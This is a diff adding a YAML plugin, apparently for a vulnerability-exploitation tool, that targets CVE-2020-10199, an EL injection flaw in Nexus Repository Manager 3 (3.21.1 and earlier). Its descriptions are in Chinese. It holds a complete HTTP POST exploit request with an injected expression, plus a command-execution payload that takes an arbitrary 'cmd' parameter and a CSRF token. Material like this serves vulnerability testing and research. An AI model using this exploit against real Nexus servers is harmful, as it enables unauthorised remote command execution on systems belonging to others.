@@ -1,0 +1,57 @@
+info:
+    app: Nexus
+    name: CVE_2020_10199
+    author: lz520520
+    plugin_version: 1.0.0
+    disclosure_date: "2020-03-06"
+    create_date: "2024-10-08 10:26:17"
+    update_date: "2024-10-08 10:26:17"
+    scope: <3.21.1
+    description: Nexus Repository Manager 3 是一款软件仓库，可以用来存储和分发Maven、NuGET等软件源仓库。其3.21.1及之前版本中，存在一处任意EL表达式注入漏洞。
+    vul_id: CVE_2020_10199
+    detail: 需要低权限的Cookie和CSRF Token。
+    payload: |-
+        POST /service/rest/beta/repositories/go/group HTTP/1.1
+        Host: 127.0.0.1:8081
+        Content-Length: 203
+        X-Requested-With: XMLHttpRequest
+        X-Nexus-UI: true
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
+        NX-ANTI-CSRF-TOKEN: 0.7886248393834028
+        Content-Type: application/json
+        Accept: */*
+        Origin: http://127.0.0.1:8081
+        Sec-Fetch-Site: same-origin
+        Sec-Fetch-Mode: cors
+        Referer: http://127.0.0.1:8081/
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: NX-ANTI-CSRF-TOKEN=0.7886248393834028; NXSESSIONID=cedf848f-d881-4b58-ac24-9e9c3ece40bc
+        Connection: close
+        {
+          "name": "internal",
+          "online": true,
+          "storage": {
+            "blobStoreName": "default",
+            "strictContentTypeValidation": true
+          },
+          "group": {
+            "memberNames": ["$\\A{233*233*233}"]
+          }
+        }
+    reference: https://github.com/vulhub/vulhub/blob/master/nexus/CVE-2020-10199/README.md
+    vul_type: 命令执行
+payloads:
+    - name: cmd1
+      alias: 命令执行
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            default_value: whoami
+            required: true
+          - key: NX-ANTI-CSRF-TOKEN
+            title: NX-ANTI-CSRF-TOKEN
+            param_type: edit
+            default_value: "0.7500424364058151"
+            required: true
